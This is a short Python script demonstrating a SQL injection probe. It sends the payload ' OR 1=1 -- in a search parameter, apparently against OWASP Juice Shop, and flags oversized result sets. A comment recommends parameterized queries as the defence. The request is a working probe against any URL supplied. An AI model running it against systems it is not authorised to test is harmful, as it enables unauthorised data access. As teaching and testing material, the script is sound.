import requests

import os
from dotenv import load_dotenv
load_dotenv()

# NOTE: This is a generic, educational script demonstrating the *concept* of
# SQL injection testing against a HYPOTHETICAL, locally-hosted target.
# DO NOT run this against the live URL you provided or any server you do not
# own and have explicit permission to test.

TARGET_URL = os.getenv("TARGET_URL")


# 2. The classic SQL Injection test payload
# This payload attempts to make the SQL WHERE clause always true.
# Example: ' OR 1=1 --
# The final SQL might look like: SELECT * FROM products WHERE name = '' OR 1=1 --'
# The '--' comments out the rest of the original query, including the final quote.
INJECTION_PAYLOAD = "' OR 1=1 --"

# 3. Define the query parameters
# The vulnerable parameter is often the search term ('q' in Juice Shop)
params = {
    'q': INJECTION_PAYLOAD
}

print(f"--- SQL Injection Concept Demonstration ---")
print(f"Targeting (Hypothetical): {TARGET_URL}")
print(f"Payload used in 'q' parameter: {INJECTION_PAYLOAD}")

try:
    # 4. Make the GET request
    response = requests.get(TARGET_URL, params=params)

    # 5. Analyze the hypothetical response
    if response.status_code == 200:
        print("\nRequest Successful (Status 200)")
        print(f"Response Body Snippet (first 500 chars):\n{response.text[:500]}...")

        # In a real test, if the server returns *all* products or data it shouldn't,
        # it indicates a successful injection.
        if "data" in response.json() and len(response.json()['data']) > 5:
             print("\n!!! Vulnerability Indication !!!")
             print("A large, unexpected number of results were returned (e.g., all products).")
             print("This suggests the injection payload was processed by the database.")
        else:
             print("\n(Hypothetical test failed or server is secure/not found)")
    else:
        print(f"\nRequest failed with status code: {response.status_code}")
        print("Could not connect to the hypothetical server.")

except requests.exceptions.ConnectionError:
    print("\n[ERROR] Could not connect to the target URL.")
    print("Ensure the local server is running at {TARGET_URL}")
except Exception as e:
    print(f"\nAn unexpected error occurred: {e}")


# --- DEFENSE NOTE ---
# print("\n--- Defensive Programming Mitigation ---")
# print("To prevent SQL injection, always use Parameterized Queries (Prepared Statements).")
# print("When using Prepared Statements, the database driver ensures that user input is")
# print("treated strictly as data, not as executable SQL code.")
